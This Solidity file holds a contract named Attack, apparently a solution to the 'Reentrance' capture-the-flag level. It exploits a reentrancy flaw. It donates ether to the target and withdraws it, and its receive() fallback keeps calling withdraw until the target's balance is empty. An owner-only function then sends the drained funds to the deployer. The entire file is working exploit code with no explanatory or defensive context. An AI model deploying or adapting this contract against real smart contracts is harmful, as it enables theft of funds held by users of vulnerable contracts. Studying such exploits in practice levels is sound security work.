// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

interface Reentrance {
    function withdraw(uint256 _amount) external;
    function donate(address _to) external payable;
    function balanceOf(address _account) external view returns (uint256);
}

contract Attack {
    Reentrance target;
    address owner;
    uint256 amount;

    constructor(address _target) public {
        target = Reentrance(payable(_target));
        owner = msg.sender;
    }

    modifier _ownerOnly() {
        require(msg.sender == owner, "Only owner can call this function.");
        _;
    }

    function attack() public payable {
        target.donate{value: msg.value}(address(this));       
        amount =  target.balanceOf(address(this));
        target.withdraw(amount);
    }

    function withdraw() public _ownerOnly {
        payable(msg.sender).transfer(amount);
    }

    receive() external payable {
        if (address(target).balance != 0) {
            target.withdraw(amount);
        }
    }
}
